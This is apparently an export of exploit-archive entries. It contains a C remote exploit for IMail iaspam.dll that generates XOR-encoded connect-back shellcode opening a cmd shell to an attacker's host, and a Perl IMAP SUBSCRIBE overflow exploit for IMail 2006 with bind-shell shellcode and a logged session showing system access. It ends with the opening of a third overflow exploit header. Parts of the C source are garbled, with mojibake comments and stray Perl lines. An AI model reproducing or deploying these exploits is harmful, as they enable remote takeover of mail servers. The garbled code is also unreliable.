00401004   . /EB 0E         JMP SHORT encode.00401014
00401006   $ |5B            POP EBX
00401007   . |4B            DEC EBX
00401008   . |33C9          XOR ECX,ECX
0040100A   . |B1 FF         MOV CL,0FF
0040100C   > |80340B 99     XOR BYTE PTR DS:[EBX+ECX],99
00401010   .^|E2 FA         LOOPD SHORT encode.0040100C
00401012   . |EB 05         JMP SHORT encode.00401019
00401014   > \E8 EDFFFFFF   CALL encode.00401006
""\xEB\x0E\x5B\x4B\x33\xC9\xB1""
""\xFF""          // shellcode size
""\x80\x34\x0B""
""\xB8""          // xor byte
""\xE2\xFA\xEB\x05\xE8\xED\xFF\xFF\xFF"";
unsigned char decode2[] =
00406030   /EB 10           JMP SHORT 00406042
00406032   |5B              POP EBX
00406033   |4B              DEC EBX
00406034   |33C9            XOR ECX,ECX
00406036   |66:B9 6601      MOV CX,166
0040603A   |80340B 99       XOR BYTE PTR DS:[EBX+ECX],99
0040603E  ^|E2 FA           LOOPD SHORT 0040603A
00406040   |EB 05           JMP SHORT 00406047
00406042   \E8 EBFFFFFF     CALL 00406032
""\xEB\x10\x5B\x4B\x33\xC9\x66\xB9""
""\x66\x01""      // shellcode size
""\x80\x34\x0B""
""\xB8""          // xor byte
""\xE2\xFA\xEB\x05\xE8\xEB\xFF\xFF\xFF"";
unsigned char functions[100][128] =
{                                           // [esi] stack layout
{""LoadLibraryA""},                       //    [esi]
{""CreateProcessA""},                     //    [esi+4]
{""ExitThread""},                         //    [esi+8]
{""WaitForSingleObject""},                //    [esi+12]
{""WSASocketA""},                         //    [esi+16]
{""connect""},                            //    [esi+20]
{""closesocket""},                        //    [esi+24]
void PrintSc(unsigned char *lpBuff, int buffsize);
void ShellCode();
unsigned long hash(unsigned char *c)
unsigned long h=0;
while(*c)
h = ( ( h << 25 ) | ( h >> 7 ) ) + *c++;
return h;
void GetShellCode(char* ipstr, short port)
char  *fnbgn_str=""\x90\x90\x90\x90\x90\x90\x90\x90\x90"";
char  *fnend_str=""\x90\x90\x90\x90\x90\x90\x90\x90\x90"";
unsigned char  *pSc_addr;
unsigned char  pSc_Buff[2048];
unsigned int   MAX_Sc_Len=0x2000;
unsigned long  dwHash[100];
unsigned int   dwHashSize;
unsigned int l,i,j,k;
char *p;
int ip;
for (i=0;;i++) {
if (functions[i][0] == '\x0') break;
dwHash[i] = hash(functions[i]);
dwHashSize = i*4;
pSc_addr = (unsigned char *)ShellCode;
for (k=0;k<MAX_Sc_Len;++k ) {
if(memcmp(pSc_addr+k,fnbgn_str, 8)==0) {
break;
pSc_addr+=(k+8);   // start of the ShellCode
for (k=0;k<MAX_Sc_Len;++k) {
if(memcmp(pSc_addr+k,fnend_str, 8)==0) {
break;
sh_Len=k; // length of the ShellCode
memcpy(pSc_Buff, pSc_addr, sh_Len);
for(k=0; k<sh_Len; ++k)
if(memcmp(pSc_Buff+k, ""\x68\x7F\x00\x00\x01"", 5) == 0)
ip = inet_addr(ipstr);
p = (char*)&ip;
pSc_Buff[k+1] = p[0];
pSc_Buff[k+2] = p[1];
pSc_Buff[k+3] = p[2];
pSc_Buff[k+4] = p[3];
if(memcmp(pSc_Buff+k, ""\x68\x02\x00\x00\x35"", 5) == 0)
p = (char*)&port;
pSc_Buff[k+3] = p[1];
pSc_Buff[k+4] = p[0];
memcpy(pSc_Buff+sh_Len, (unsigned char *)dwHash, dwHashSize);
sh_Len += dwHashSize;
for(i=0xff; i>0; i--)
l = 0;
for(j=0; j<sh_Len; j++)
if (
((pSc_Buff[j] ^ i) == 0x00) ||
((pSc_Buff[j] ^ i) == 0x25) ||
((pSc_Buff[j] ^ i) == 0x0D) ||
((pSc_Buff[j] ^ i) == 0x0A)
l++;
break;
if (l==0)
Enc_key = i;
for(j=0; j<sh_Len; j++)
pSc_Buff[j] ^= Enc_key;
break;                        // break when found xor byte
if (l!=0){
sh_Len  = 0;
else {
if (sh_Len > 0xFF) {
*(unsigned short *)&decode2[8] = sh_Len;
*(unsigned char *)&decode2[13] = Enc_key;
memcpy(sh_Buff, decode2, sizeof(decode2)-1);
memcpy(sh_Buff+sizeof(decode2)-1, pSc_Buff, sh_Len);
sh_Len += sizeof(decode2)-1;
else {
*(unsigned char *)&decode1[7]  = sh_Len;
*(unsigned char *)&decode1[11] = Enc_key;
memcpy(sh_Buff, decode1, sizeof(decode1)-1);
memcpy(sh_Buff+sizeof(decode1)-1, pSc_Buff, sh_Len);
sh_Len += sizeof(decode1)-1;
void PrintSc(unsigned char *lpBuff, int buffsize)
int i,j;
char *p;
char msg[4];
printf(""/* %d bytes */\n"",buffsize);
for(i=0;i<buffsize;i++)
if((i%16)==0)
if(i!=0)
printf(""\""\n\"""");
else
printf(""\"""");
sprintf(msg,""\\x%.2X"",lpBuff[i]&0xff);
for( p = msg, j=0; j < 4; p++, j++ )
if(isupper(*p))
printf(""%c"", _tolower(*p));
else
printf(""%c"", p[0]);
printf( ""\"";\n"");
void ShellCode()
__asm
PROC_BEGIN                          // C macro to begin proc
jmp     sc_end
sc_start:
pop     edi                         // Hash string start addr (esp -> edi)
mov     eax, fs:0x30                // PEB
mov     eax, [eax+0x0c]             // PROCESS_MODULE_INFO
mov     esi, [eax+0x1c]             // InInitOrder.flink
lodsd                               // eax = InInitOrder.blink
mov     ebp, [eax+8]                // ebp = kernel32.dll base address
mov     esi, edi                    // Hash string start addr -> esi
push    _Knums
pop     ecx
get_kernel32:
call    GetProcAddress_fun
loop    get_kernel32
push    0x00003233
push    0x5f327377
push    esp
call    dword ptr [esi+_LoadLibraryA]         // LoadLibraryA(""ws2_32"");
xchg    eax, ebp
push    _Wnums
pop     ecx
get_ws2_32:
call    GetProcAddress_fun
loop    get_ws2_32
sub     esp, 400
push    esp
push    0x101
call    dword ptr [esi+_WSAStartup]             // WSAStartup(0x101, &WSADATA);
push    ecx
push    ecx
push    ecx
push    ecx
push    1
push    2
call    dword ptr [esi+_WSASocketA]   // s=WSASocketA(2,1,0,0,0,0);
xchg    eax, ebx
push    0x0100007F // host: 127.0.0.1
push    0x35000002 // port: 53
mov     ebp, esp
push    0x10                        // sizeof(sockaddr_in)
push    ebp                         // sockaddr_in address
push    ebx                         // socket s
call    dword ptr [esi+_connect]    // connect(s, name, sizeof(name));
test    eax, eax
jne     Finished
mov     edi, esp
push    0x12
pop     ecx
stack_zero:
stosd
loop    stack_zero
mov     word ptr  [esp+0x3c], 0x0101
xchg    eax, ebx
stosd
stosd
stosd
mov     edi, esp
push    0x00646d63                  // ""cmd""
mov     ebp, esp
push    eax                         // socket
lea     eax, [edi+0x10]
push    edi                         // pi
push    eax                         // si
push    ecx                         // lpCurrentDirectory
push    ecx                         // lpEnvironment
push    ecx                         // dwCreationFlags
push    1                           // bInheritHandles
push    ecx                         // lpThreadAttributes
push    ecx                         // lpProcessAttributes
push    ebp                         // lpCommandLine =  ""cmd""
push    ecx                         // lpApplicationName NULL
call    dword ptr [esi+_CreateProcessA]         // CreactProcessA(NULL,""CMD"",0,0,1,0,0,0,si, pi);
push    0xFFFFFFFF
push    dword ptr [edi]
call    dword ptr [esi+_WaitForSingleObject]    // WaitForSingleObject(Handle, time) ;
call    dword ptr [esi+_closesocket]           // closesocket(c);
Finished:
mov     eax, 0x1003546c
mov     DWORD ptr [eax],    0x1003549c
mov     DWORD ptr [eax+4],  0x100354c8
mov     DWORD ptr [eax+8],  0x100354e0
xor     eax, eax
push    eax
call    dword ptr [esi+_ExitThread]
GetProcAddress_fun:
push    ecx
push    esi
mov     esi, [ebp+0x3C]             // e_lfanew
mov     esi, [esi+ebp+0x78]         // ExportDirectory RVA
add     esi, ebp                    // rva2va
push    esi
mov     esi, [esi+0x20]              // AddressOfNames RVA
add     esi, ebp                    // rva2va
xor     ecx, ecx
dec     ecx
find_start:
inc     ecx
lodsd
add     eax, ebp
xor     ebx, ebx
hash_loop:
movsx   edx, byte ptr [eax]
cmp     dl, dh
jz      short find_addr
ror     ebx, 7               // hash key
add     ebx, edx
inc     eax
jmp     short hash_loop
find_addr:
cmp     ebx, [edi]                  // compare to hash
jnz     short find_start
pop     esi                         // ExportDirectory
jmp over_it
__asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40
__asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40
__asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40
__asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40
over_it:
mov     ebx, [esi+0x24]
add     ebx, ebp                    // rva2va
mov     cx, [ebx+ecx*2]             // FunctionOrdinal
mov     ebx, [esi+0x1C]             // AddressOfFunctions RVA
add     ebx, ebp                    // rva2va
mov     eax, [ebx+ecx*4]            // FunctionAddress RVA
add     eax, ebp                    // rva2va
stosd                               // function address save to [edi]
pop     esi
pop     ecx
ret
sc_end:
call sc_start
PROC_END                            //C macro to end proc
int Make_Connection(char *address,int port,int timeout)
struct sockaddr_in target;
SOCKET s;
int i;
DWORD bf;
fd_set wd;
struct timeval tv;
s = socket(AF_INET,SOCK_STREAM,0);
if(s<0)
return -1;
target.sin_family = AF_INET;
target.sin_addr.s_addr = inet_addr(address);
if(target.sin_addr.s_addr==0)
closesocket(s);
return -2;
target.sin_port = htons((short)port);
bf = 1;
ioctlsocket(s,FIONBIO,&bf);
tv.tv_sec = timeout;
tv.tv_usec = 0;
FD_ZERO(&wd);
FD_SET(s,&wd);
connect(s,(struct sockaddr *)&target,sizeof(target));
if((i=select(s+1,0,&wd,0,&tv))==(-1))
closesocket(s);
return -3;
if(i==0)
closesocket(s);
return -4;
i = sizeof(int);
getsockopt(s,SOL_SOCKET,SO_ERROR,(char *)&bf,&i);
if((bf!=0)||(i!=sizeof(int)))
closesocket(s);
return -5;
ioctlsocket(s,FIONBIO,&bf);
return s;
void Disconnect(SOCKET s)
closesocket(s);
WSACleanup();
void help(char *n)
printf(""==Usage:\n"");
printf(""%s [target ip] [target port] [local ip] [local port]\n\n"", n);
printf(""We will send 4 mail to trigger the vuln.\n"");
printf(""The fucking vuln will be triggered when the mail server handling the mail.\n"");
printf(""Because of the Spam in the internet,\nthe vuln maybe triggered after a few days!!Fuck!!\n\n"");
int sendfuckingmail(int the_mail, char *target, int tg_port)
SOCKET  s;
WSADATA WSAData;
char buffer[1000] = {0};    // ÃÃ™ÃŠÂ±bufferÃ“ÃƒÃ“Ãšio
int  ret;
char padding[5000] = {0};   // paddingÃ“ÃƒÃ“ÃšÃŒÃ®Â³Ã¤
if(WSAStartup (MAKEWORD(1,1), &WSAData) != 0)
fprintf(stderr, ""[-] WSAStartup failed.\n"");
WSACleanup();
exit(1);
s = Make_Connection(target, tg_port, 10);
if(s<0)
fprintf(stderr, ""[-] connect err.\n"");
exit(1);
recv(s, buffer, sizeof(buffer), 0);
Sleep(1000);
ret = strlen(buffer);
if ( ret < 10 )
printf(""[-]Seems Service Down~ :( \n"");
Disconnect(s);
return -1;
printf(""[+]Got Banner: %s"", buffer);
send(s, szEHLO, strlen(szEHLO), 0);
recv(s, buffer, sizeof(buffer), 0);
printf(""[+]Say hello to Server.\n"");
memset(buffer, 0, sizeof(buffer));
Sleep(500);
send(s, szMF, strlen(szMF), 0);
recv(s, buffer, sizeof(buffer), 0);
if(strstr(buffer, ""250""))
printf(""[+]Recv: %s"", buffer);
else
printf(""[-]Seems Service Down~ :( \n"");
Disconnect(s);
return -1;
memset(buffer, 0, sizeof(buffer));
Sleep(500);
send(s, szRCPT, strlen(szRCPT), 0);
recv(s, buffer, sizeof(buffer), 0);
if(strstr(buffer, ""250""))
printf(""[+]Recv: %s"", buffer);
else
printf(""[-]Seems Service Down~ :( \n"");
Disconnect(s);
return -1;
memset(buffer, 0, sizeof(buffer));
Sleep(500);
send(s, szDATA, strlen(szDATA), 0);
recv(s, buffer, sizeof(buffer), 0);
if(strstr(buffer, ""354""))
printf(""[+]Recv: %s"", buffer);
else
printf(""[-]Seems Service Down~ :( \n"");
Disconnect(s);
return -1;
memset(buffer, 0, sizeof(buffer));
Sleep(100);
send(s, szTIME, strlen(szTIME), 0);
printf(""[+]Fucking Server at %s"", szTIME);
memset(buffer, 0, sizeof(buffer));
Sleep(200);
if (the_mail == 0)   // Â·Â¢Ã’Â»Â·Ã¢Â·ÃÃ“ÃŠÅ’Ã¾Â£Â¬ÃŒÃ¡Å¾ÃŸÂ³Ã‰Â¹Å Ã‚ÃŠ
my $padding = ""\x22"".""B""x2028;
my $padding1 = ""B""x2046;
my $padding11 = ""B""x146;   #163Å¾Ã¶B
my $straddr1 = ""\x50\xd0\xfd\x7f"".""\x30\xd0\xfd\x7f"";     # Ã”ÃštebÃ–Ã
my $straddr2 = ""\x50\xc0\xfd\x7f"";     # shellcodeÂ»Ã¡Â¿Å“Â±Å½ÂµÅ“ÂµÃ„ÂµÃ˜Ã–Â·
print $sock ""Content-Type: multipart\/boundary=$padding $padding1 $padding11$straddr1$straddr2\r\n"";
memcpy(payload, szCT, strlen((const char *)szCT));
memset(padding, 0x43, 5000);
padding[0] = '\x22';
padding[2029] = '\x20';
padding[4076] = '\x20';
padding[4223] = '\x50';
padding[4224] = '\xd0';
padding[4225] = '\xfd';
padding[4226] = '\x7f';
padding[4227] = '\x30';
padding[4228] = '\xd0';
padding[4229] = '\xfd';
padding[4230] = '\x7f';
padding[4231] = '\x30';
padding[4232] = '\xd8';
padding[4233] = '\xfd';
padding[4234] = '\x7f';
padding[4235] = '\x0d';
padding[4236] = '\x0a';
padding[4237] = '\x00';
memcpy(payload+strlen((const char *)szCT), padding, strlen((const char *)padding));
send(s, (const char *)payload, strlen((const char *)payload), 0);
Sleep(100);
send(s, (const char *)szMIME, strlen((const char *)szMIME), 0);
memset(padding, 0x43, 80);
padding[80] = '\x00';
memset(payload, 0x00, sizeof(payload));
memcpy(payload, szCTE, strlen((const char*)szCTE));
memcpy(payload+strlen((const char*)szCTE), padding, strlen((const char*)padding));
memcpy(payload+strlen((const char*)szCTE)+strlen((const char*)padding), ""\r\n"", 2);
Sleep(200);
send(s, (const char *)payload, strlen((const char *)payload), 0);
memset(payload, 0x00, sizeof(payload));
else if (the_mail == 1)   // Â¹Â¹Ã”Ã¬bufferoverflowÂµÃ„Å¾Â²Å¾Ã‡Ã—Ã–Â·Ã»Å½Â®
my $padding = ""\x22"".""B""x2028;
my $padding1 = ""B""x2046;
my $padding11 = ""B""x146;   #163Å¾Ã¶B
my $straddr1 = ""\x50\xd0\xfd\x7f"".""\x30\xd0\xfd\x7f"";     # Ã”ÃštebÃ–Ã
my $straddr2 = ""\x50\xc0\xfd\x7f"";     # shellcodeÂ»Ã¡Â¿Å“Â±Å½ÂµÅ“ÂµÃ„ÂµÃ˜Ã–Â·
print $sock ""Content-Type: multipart\/boundary=$padding $padding1 $padding11$straddr1$straddr2\r\n"";
memcpy(payload, szCT, strlen((const char *)szCT));
memset(padding, 0x43, 5000);
padding[0] = '\x22';
padding[2029] = '\x20';
padding[4076] = '\x20';
padding[4223] = '\x50';
padding[4224] = '\xd0';
padding[4225] = '\xfd';
padding[4226] = '\x7f';
padding[4227] = '\x30';
padding[4228] = '\xd0';
padding[4229] = '\xfd';
padding[4230] = '\x7f';
padding[4231] = '\x50';
padding[4232] = '\xc0';
padding[4233] = '\xfd';
padding[4234] = '\x7f';
padding[4235] = '\x0d';
padding[4236] = '\x0a';
padding[4237] = '\x00';
memcpy(payload+strlen((const char *)szCT), padding, strlen((const char *)padding));
send(s, (const char *)payload, strlen((const char *)payload), 0);
Sleep(100);
send(s, (const char *)szMIME, strlen((const char *)szMIME), 0);
memset(padding, 0x43, 80);
padding[80] = '\x00';
memset(payload, 0x00, sizeof(payload));
memcpy(payload, szCTE, strlen((const char*)szCTE));
memcpy(payload+strlen((const char*)szCTE), padding, strlen((const char*)padding));
memcpy(payload+strlen((const char*)szCTE)+strlen((const char*)padding), ""\r\n"", 2);
Sleep(200);
send(s, (const char *)payload, strlen((const char *)payload), 0);
memset(payload, 0x00, sizeof(payload));
memset(payload, 0x44, 520);
memcpy(payload+520, SCaddr, strlen((const char *)SCaddr));
memcpy(payload+520+4, ""\r\n"", 2);
Sleep(200);
send(s, (const char *)payload, strlen((const char *)payload), 0);
memset(payload, 0x00, sizeof(payload));
else if (the_mail == 2)      // Â·Â¢Ã‹Ãshellcode
my $padding = ""\x22"".""B""x2028;
my $padding1 = ""B""x2046;
my $padding11 = ""B""x146;   #163Å¾Ã¶B
my $straddr1 = ""\x50\xd0\xfd\x7f"".""\x30\xd0\xfd\x7f"";     # Ã”ÃštebÃ–Ã
my $straddr2 = ""\x50\xe7\x03\x10"";     # shellcodeÂ»Ã¡Â¿Å“Â±Å½ÂµÅ“ÂµÃ„ÂµÃ˜Ã–Â·
print $sock ""Content-Type: multipart\/boundary=$padding $padding1 $padding11$straddr1$straddr2\r\n"";
memcpy(payload, szCT, strlen((const char *)szCT));
memset(padding, 0x43, 5000);
padding[0] = '\x22';
padding[2029] = '\x20';
padding[4076] = '\x20';
padding[4223] = '\x50';
padding[4224] = '\xd0';
padding[4225] = '\xfd';
padding[4226] = '\x7f';
padding[4227] = '\x30';
padding[4228] = '\xd0';
padding[4229] = '\xfd';
padding[4230] = '\x7f';
padding[4231] = '\x50';
padding[4232] = '\xc8';
padding[4233] = '\xfd';
padding[4234] = '\x7f';
padding[4235] = '\x0d';
padding[4236] = '\x0a';
padding[4237] = '\x00';
memcpy(payload+strlen((const char *)szCT), padding, strlen((const char *)padding));
send(s, (const char *)payload, strlen((const char *)payload), 0);
send(s, (const char *)szMIME, strlen((const char *)szMIME), 0);
memset(padding, 0x43, 80);
padding[80] = '\x00';
memset(payload, 0x00, sizeof(payload));
memcpy(payload, szCTE, strlen((const char*)szCTE));
memcpy(payload+strlen((const char*)szCTE), padding, strlen((const char*)padding));
memcpy(payload+strlen((const char*)szCTE)+strlen((const char*)padding), ""\r\n"", 2);
send(s, (const char *)payload, strlen((const char *)payload), 0);
Sleep(200);
memset(payload, 0x00, sizeof(payload));
memcpy(payload, sh_Buff, strlen((const char*)sh_Buff));
memcpy(payload+strlen((const char*)sh_Buff), ""\r\n"", 2);
send(s, (const char *)payload, strlen((const char *)payload), 0);
memset(payload, 0x00, sizeof(payload));
else   //  ÂµÃšÃˆÃ½Â·Ã¢Ã“ÃŠÅ’Ã¾Â£Â¬Â¹Â¹Ã”Ã¬Ã’Ã§Â³Ã¶
Sleep(500);  // Ã’Ã²ÃŽÂªÃ’ÂªÅ½Â¥Â·Â¢Ã‚Â©Â¶Å½ÃÃ‹Â£Â¬Ã‹Ã¹Ã’Ã”Â±Ã˜ÃÃ«Ã’ÂªÃÃ­ÂµÃ£Â£Â¬Â²Â»ÃˆÂ»shellcodeÃƒÂ»ÂµÅ“ÃŽÂ»
my $padding = ""\x22"".""B""x2028;
my $padding1 = ""B""x2046;
my $padding11 = ""B""x146;   #163Å¾Ã¶B
my $straddr1 = ""\x50\xd0\xfd\x7f"".""\x30\xd0\xfd\x7f"";     # Ã”ÃštebÃ–Ã
my $straddr2 = ""\x6c\x54\x03\x10"";     # shellcodeÂ»Ã¡Â¿Å“Â±Å½ÂµÅ“ÂµÃ„ÂµÃ˜Ã–Â·
print $sock ""Content-Type: multipart\/boundary=$padding $padding1 $padding11$straddr1$straddr2\r\n"";
memcpy(payload, szCT, strlen((const char *)szCT));
memset(padding, 0x43, 5000);
padding[0] = '\x22';
padding[2029] = '\x20';
padding[4076] = '\x20';
padding[4223] = '\x50';
padding[4224] = '\xd0';
padding[4225] = '\xfd';
padding[4226] = '\x7f';
padding[4227] = '\x30';
padding[4228] = '\xd0';
padding[4229] = '\xfd';
padding[4230] = '\x7f';
padding[4231] = '\x6c';
padding[4232] = '\x54';
padding[4233] = '\x03';
padding[4234] = '\x10';
padding[4235] = '\x0d';
padding[4236] = '\x0a';
padding[4237] = '\x00';
memcpy(payload+strlen((const char *)szCT), padding, strlen((const char *)padding));
send(s, (const char *)payload, strlen((const char *)payload), 0);
send(s, (const char *)szMIME, strlen((const char *)szMIME), 0);
memset(padding, 0x43, 80);
padding[80] = '\x00';
memset(payload, 0x00, sizeof(payload));
memcpy(payload, szCTE, strlen((const char*)szCTE));
memcpy(payload+strlen((const char*)szCTE), padding, strlen((const char*)padding));
memcpy(payload+strlen((const char*)szCTE)+strlen((const char*)padding), ""\r\n"", 2);
send(s, (const char *)payload, strlen((const char *)payload), 0);
Sleep(200);
memset(payload, 0x00, sizeof(payload));
memcpy(payload, ""\x50\xc0\xfd\x7f"", 4);
memcpy(payload+4, ""\x40\xc0\xfd\x7f\x30\xc0\xfd\x7f"", 8);
memcpy(payload+12, ""\r\n"", 2);
send(s, (const char *)payload, strlen((const char *)payload), 0);
memset(payload, 0x00, sizeof(payload));
Sleep(500);
send(s, szEND, strlen(szEND), 0);
recv(s, buffer, sizeof(buffer), 0);
if(strstr(buffer, ""250""))
printf(""[+]Recv: %s"", buffer);
else
printf(""[-]Seems Service Down~ :( \n"");
Disconnect(s);
return -1;
memset(buffer, 0, sizeof(buffer));
send(s, szQUIT, strlen(szQUIT), 0);
recv(s, buffer, sizeof(buffer), 0);
printf(""[+]Fucking END, Ejaculating Now !\n\n"");
memset(buffer, 0, sizeof(buffer));
Sleep(400);
closesocket(s);
WSACleanup();
return 0;
int main(int argc, char *argv[])
printf(""\n== IMail iaspam.dll 8.01-8.11 Private Remote Exploit\n"");
printf(""== by axis@ph4nt0m\n"");
printf(""== http://www.ph4nt0m.org\n"");
printf(""== 2007-06\n"");
printf(""== 2007-09-18 published as a gift for the 6th Anniversary of Ph4nt0m\n"");
printf(""== ConnBack Version\n"");
printf(""== Thanks EnvyMask@ph4nt0m\n\n"");
if(argc != 5)
help(argv[0]);
return 0;
if(argc == 5) port = atoi(argv[4]);
GetShellCode(argv[3], port);
if (!sh_Len)
printf(""[-] Shellcode generate error.\n"");
exit(1);
Sleep(200);
for (int mail_payload = 0; mail_payload <= 3; mail_payload++)
sendfuckingmail(mail_payload, argv[1], atoi(argv[2]));
Sleep(2000);
printf(""Got a Shell on your port ?! @_@\n\n"");
return 1;"
2007-07-26,Remote,Windows,ZhenHan.Liu,IPSwitch IMail Server 2006 9.10,Subscribe Remote Overflow,"#!/use/bin/perl
# Test on Imail 2006(9.10), imap4d32.exe(6.8.8.1), windows 2003 Chinese SP1
# Code by yunshu, our team: www.ph4nt0m.org  Mail list: http://list.ph4nt0m.org
#F:\>perl imail_SUBSCRIBE.pl 192.168.1.2 test_user test_pass
#* OK IMAP4 Server (IMail 9.10)
#0 OK LOGIN completed
#* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
#* 0 EXISTS
#* 0 RECENT
#* OK [UIDVALIDITY 1185270594] UIDs valid
#* OK [UIDNEXT 485270595] Predicted next UID
#2 OK [READ-WRITE] SELECT completed
#3 OK SUBSCRIBE completed
#Trying..
#Bingle!Maybe get it!
#You can try to telnet 22 port, do you have nc?
#D:\Microsoft Visual Studio 8\VC>nc -vv 192.168.1.2 22
#192.168.1.2: inverse host lookup failed: h_errno 11004: NO_DATA
#(UNKNOWN) [192.168.1.2] 22 (?) open
#Microsoft Windows [.. 5.2.3790]
#(C) .... 1985-2003 Microsoft Corp.
#C:\WINDOWS\system32>net user
#net user
#\\ .....
#Administrator            ASPNET                   Guest
#IUSR_WIN2K3              IWAM_WIN2K3              SUPPORT_388945a0
#C:\WINDOWS\system32>
# win32_bind -  EXITFUNC=thread LPORT=22 Size=344 Encoder=Pex http://metasploit.com
#my $opcode = ""\x61\x62\x63\x64"";
# login
# milw0rm.com [2007-07-26]","use strict;
use warnings;
use IO::Socket;
if( @ARGV != 3 )
my $banner = qq{
Imail subscribe exploit, Test on Imail 2006(9.10),windows 2003 Chinese SP1
You must have a account to login the imap server, good luck!
Code by yunshu, our team www.ph4nt0m.org, enjoin this exp~~
imail_subscribe.pl  <host>   <username>   <password>
print $banner.""\n"";
exit( -1 );
my $host = $ARGV[0];
my $user = $ARGV[1];
my $pass = $ARGV[2];
my $shellcode =
""\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x41"".
""\xd1\xfd\xbc\x83\xeb\xfc\xe2\xf4\xbd\xbb\x16\xf1\xa9\x28\x02\x43"".
""\xbe\xb1\x76\xd0\x65\xf5\x76\xf9\x7d\x5a\x81\xb9\x39\xd0\x12\x37"".
""\x0e\xc9\x76\xe3\x61\xd0\x16\xf5\xca\xe5\x76\xbd\xaf\xe0\x3d\x25"".
""\xed\x55\x3d\xc8\x46\x10\x37\xb1\x40\x13\x16\x48\x7a\x85\xd9\x94"".
""\x34\x34\x76\xe3\x65\xd0\x16\xda\xca\xdd\xb6\x37\x1e\xcd\xfc\x57"".
""\x42\xfd\x76\x35\x2d\xf5\xe1\xdd\x82\xe0\x26\xd8\xca\x92\xcd\x37"".
""\x01\xdd\x76\xcc\x5d\x7c\x76\xfc\x49\x8f\x95\x32\x0f\xdf\x11\xec"".
""\xbe\x07\x9b\xef\x27\xb9\xce\x8e\x29\xa6\x8e\x8e\x1e\x85\x02\x6c"".
""\x29\x1a\x10\x40\x7a\x81\x02\x6a\x1e\x58\x18\xda\xc0\x3c\xf5\xbe"".
""\x14\xbb\xff\x43\x91\xb9\x24\xb5\xb4\x7c\xaa\x43\x97\x82\xae\xef"".
""\x12\x82\xbe\xef\x02\x82\x02\x6c\x27\xb9\xfd\xaa\x27\x82\x74\x5d"".
""\xd4\xb9\x59\xa6\x31\x16\xaa\x43\x97\xbb\xed\xed\x14\x2e\x2d\xd4"".
""\xe5\x7c\xd3\x55\x16\x2e\x2b\xef\x14\x2e\x2d\xd4\xa4\x98\x7b\xf5"".
""\x16\x2e\x2b\xec\x15\x85\xa8\x43\x91\x42\x95\x5b\x38\x17\x84\xeb"".
""\xbe\x07\xa8\x43\x91\xb7\x97\xd8\x27\xb9\x9e\xd1\xc8\x34\x97\xec"".
""\x18\xf8\x31\x35\xa6\xbb\xb9\x35\xa3\xe0\x3d\x4f\xeb\x2f\xbf\x91"".
""\xbf\x93\xd1\x2f\xcc\xab\xc5\x17\xea\x7a\x95\xce\xbf\x62\xeb\x43"".
""\x34\x95\x02\x6a\x1a\x86\xaf\xed\x10\x80\x97\xbd\x10\x80\xa8\xed"".
""\xbe\x01\x95\x11\x98\xd4\x33\xef\xbe\x07\x97\x43\xbe\xe6\x02\x6c"".
""\xca\x86\x01\x3f\x85\xb5\x02\x6a\x13\x2e\x2d\xd4\xae\x1f\x1d\xdc"".
""\x12\x2e\x2b\x43\x91\xd1\xfd\xbc"";
my $sock = IO::Socket::INET->new( PeerHost=>$host, PeerPort=>""143"", proto=>""tcp"" ) || die ""Connect error.\n"";
my $res = <$sock>;
print $res;
if( $res !~ /OK/ )
exit( -1 );
my $opcode = ""\x60\x1A\x9C\x76"";
my $num = 264991;
my $nop = ""#IMAILPUB"" . ""\x90"" x ( $num - length($shellcode) ).$shellcode.""\x90\x90\xeb\x06"".$opcode.""\x90\x90\x90\x90"".""\xE9\x44\xfd\xff\xff"".""\x90"" x 400;
print $sock ""0 LOGIN $user $pass\r\n"";
$res = <$sock>;
if( ! defined($res) )
exit(-1);
print $res;
if( $res !~ /OK/ )
exit(-1);
print $sock ""2 SELECT INBOX\r\n"";
while( <$sock> )
print $_;
if( $_ =~ /2 OK/ || $_ =~ /2 BAD/ )
last;
print $sock ""3 SUBSCRIBE \""$nop\""\r\n"";
$res = <$sock>;
if( ! defined($res) )
exit(-1);
print $res;
print ""Trying..\n"";
sleep( 15 );
print ""Bingle! Maybe get it!\nYou can try to telnet 22 port, do you have nc?\n"";
print $sock ""4 LOGOUT\r\n"";
print <$sock>;
$sock->close();"
2007-07-25,Remote,Windows,ZhenHan.Liu,IPSwitch IMail Server 2006,SEARCH Remote Stack Overflow,"#!/use/bin/perl
# Ipswitch IMail Server 2006 IMAP SEARCH COMMAND Stack Overflow Exploit
# Author: ZhenHan.Liu#ph4nt0m.org
# Date: 2007-07-25
# Team: Ph4nt0m Security Team (http://www.ph4nt0m.org)
# Vuln Found by: Manuel Santamarina Suarez
# http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=563
# The Vuln code is here (imap4d32.exe version 6.8.8.1)
#  00418CCA  |.  8B8D 28EFFFFF |MOV ECX,DWORD PTR SS:[EBP-10D8]
#  00418CD0  |.  0FBE11        |MOVSX EDX,BYTE PTR DS:[ECX]
#  00418CD3  |.  83FA 22       |CMP EDX,22
#  00418CD6  |.  75 2A         |JNZ SHORT IMAP4D32.00418D02
#  00418CD8  |.  8B85 28EFFFFF |MOV EAX,DWORD PTR SS:[EBP-10D8]
#  00418CDE  |.  50            |PUSH EAX                                ; /String
#  00418CDF  |.  FF15 84004300 |CALL DWORD PTR DS:[<&KERNEL32.lstrlenA>>; \lstrlenA
#  00418CE5  |.  83E8 02       |SUB EAX,2
#  00418CE8  |.  50            |PUSH EAX                                ; /maxlen
#  00418CE9  |.  8B8D 28EFFFFF |MOV ECX,DWORD PTR SS:[EBP-10D8]         ; |
#  00418CEF  |.  83C1 01       |ADD ECX,1                               ; |
#  00418CF2  |.  51            |PUSH ECX                                ; |src
#  00418CF3  |.  8D55 AC       |LEA EDX,DWORD PTR SS:[EBP-54]           ; |
#  00418CF6  |.  52            |PUSH EDX                                ; |dest
#  00418CF7  |.  FF15 00024300 |CALL DWORD PTR DS:[<&MSVCR71.strncpy>]  ; \strncpy
#  00418CFD  |.  83C4 0C       |ADD ESP,0C
#  00418D00  |.  EB 13         |JMP SHORT IMAP4D32.00418D15
#  00418D02  |>  8B85 28EFFFFF |MOV EAX,DWORD PTR SS:[EBP-10D8]
#  00418D08  |.  50            |PUSH EAX                                ; /src
